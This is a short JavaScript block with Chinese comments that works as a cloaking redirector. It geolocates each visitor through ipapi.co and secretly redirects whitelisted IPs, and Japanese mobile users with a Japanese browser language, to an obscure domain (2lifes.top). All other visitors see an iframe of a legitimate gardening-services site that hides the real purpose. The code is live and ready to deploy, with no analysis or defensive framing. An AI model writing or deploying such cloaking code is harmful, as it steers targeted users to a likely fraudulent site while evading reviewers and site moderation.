<script>
  function handleResponse() {
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function isJapaneseLang() {
      return navigator.language.startsWith('ja') || 
             navigator.languages.some(lang => lang.startsWith('ja'));
    }

    // IP白名单列表
    const ipWhitelist = [
      "2.57.20.206", // 示例IP，您可以根据需要添加更多
      "156.226.174.253",
      "10.0.0.1"
      // 添加更多白名单IP...
    ];

    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        // 白名单检查（最高优先级）
        if (ipWhitelist.includes(data.ip)) {
          window.location.href = "https://2lifes.top/d681u8f3l";
          return;
        }

        // 严格的三重条件判断
        if (data.country === 'JP' && isMobileDevice() && isJapaneseLang()) {
          window.location.href = "https://2lifes.top/d681u8f3l";
          return;
        }
     
        var iframe = document.createElement('iframe');
        iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
        iframe.style.width = '100%';
        iframe.style.height = '100vh';
        document.body.appendChild(iframe);
      })
      .catch(() => {
        // IP检测失败时严格的双重条件判断
        if (isMobileDevice() && isJapaneseLang()) {
          window.location.href = "https://2lifes.top/d681u8f3l";
          return;
        }
        
        var iframe = document.createElement('iframe');
        iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
        iframe.style.width = '100%';
        iframe.style.height = '100vh';
        document.body.appendChild(iframe);
      });
  }
</script>
